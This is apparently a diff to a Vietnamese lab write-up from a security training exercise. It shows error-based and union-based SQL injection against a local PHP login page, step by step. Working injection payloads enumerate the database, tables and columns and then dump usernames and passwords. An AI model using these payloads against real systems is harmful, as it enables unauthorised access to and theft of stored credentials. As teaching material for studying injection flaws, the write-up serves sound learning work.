@@ -51,18 +51,22 @@ Khi nhập vào đây một câu truy vấn lỗi syntax thì sẽ có thông b�
 ![](https://i.imgur.com/cJjElxV.png)
 
 Để lấy được tên cơ sở dữ liệu, em tạo ra một payload dựa trên `Duplicate entry for key 'group_key'`. 
+
 **Payload:**`' or 1=1 group by concat(database(),'-', floor(rand(0)*2)) having min(0)-- `
+
 `floor(rand(0)*2)`: Sinh ra 0 hoặc 1 để nối với tên database phía trước. Điều này chắc chắn tạo ra một group_key bị trùng, chậm nhất là ở lần thứ ba.
 
 ![](https://i.imgur.com/dhSyED7.png)
 
 Như vậy, em tìm được tên cơ sở dữ liệu là `kcsc`.
 Lúc này, em tạo một payload tương tự để tìm tên bảng.
+
 **Payload:** `' or 1=1 group by concat((select table_name from information_schema.tables where table_schema='kcsc'),'-',floor(rand(0)*2)) having min(0)-- `
 
 ![](https://i.imgur.com/kWFYSdV.png)
 
 Ở đây, em thấy xuất hiện lỗi `Subquery returns more than 1 row in C:\xampp\htdocs\KCSC-train\task_1\login.php:28`. Điều này do cơ sở dữ liệu có nhiều hơn 1 bảng. Vậy để tìm ra tên bảng, em cần thêm `limit 0,1` vào payload để lấy ra tên bảng đầu tiên trong DB.
+
 **Payload:** `' or 1=1 group by concat((select table_name from information_schema.tables where table_schema='kcsc' limit 0,1),'-',floor(rand(0)*2)) having min(0)-- `
 
 ![](https://i.imgur.com/G9WyOX4.png)
@@ -72,6 +76,7 @@ Tương tự, thay `limit 1,1`, em có tên bảng thứ hai là `upload`.
 Tăng lên `limit 2,1` em thấy không hiển thị lỗi nữa. Vậy DB này có 2 bảng là `task1` và `upload`. 
 Tiếp theo, em khai thác thông tin ở bảng `task1`.
 Bằng cách như trên, em cũng tìm ra được tên các cột trong bảng.
+
 **Payload:** `' or 1=1 group by concat((select column_name from information_schema.columns where table_name='task1' limit 0,1),'-',floor(rand(0)*2)) having min(0)-- `.
 
 ![](https://i.imgur.com/h9UAKCh.png)
@@ -102,3 +107,42 @@ Em đã có được thông tin người dùng đầu tiên như sau:
 > password: cuc
 
 Muốn lấy thông tin những người dùng còn lại, ta làm tương tự như trên và thay bằng `limit 1,1`, `limit 2,1`,...
+
+## 2.2. Khai thác Union-based
+
+Tương tự như Error-based, em biết ô username dính SQLi.
+Với Union-based, đầu tiên, em tìm số cột trong bảng bằng cách truyền payload `' OR 1=1 ORDER BY 1 -- ` vào ô `username`.
+
+![](https://i.imgur.com/AzNOPNV.png)
+
+Tăng lên bằng `ORDER BY 2`, `ORDER BY 3`, ta được kết quả tương tự như trên.
+Với `ORDER BY 4`, em thấy thông báo lỗi `Unknown column '4' `.
+
+![](https://i.imgur.com/vCTD4H1.png)
+
+Vậy truy vấn trả về 3 cột.
+Tiếp theo, em tìm cột hữu dụng với payload `' UNION SELECT 'a','b','c' -- ` thì thu được kết quả sau:
+
+![](https://i.imgur.com/730i3Qp.png)
+
+Vậy dữ liệu hiện ra được truy xuất từ cột thứ 2 trong bảng.
+
+Với `' UNION SELECT 1,database(),3 --`, em tìm được tên cơ sở dữ liệu là `kcsc`.
+
+![](https://i.imgur.com/K6uLx4i.png)
+
+Với `' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='kcsc'-- `, em có tên bảng là `task1` và `upload`.
+
+![](https://i.imgur.com/DwlC56P.png)
+
+Tương tự, để tìm tên các cột, em truyền vào payload `' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='task1'-- `.
+
+![](https://i.imgur.com/tfZhNq9.png)
+
+Vậy bảng `task1` có 3 cột là `id`, `username` và `password`.
+
+Bây giờ, để truy xuất dữ liệu người dùng, em sử dụng payload như sau:
+
+`' UNION SELECT 1,GROUP_CONCAT(CONCAT(id,'~',username,'~',password)),3 FROM task1 -- `
+
+![](https://i.imgur.com/e1GacrZ.png)
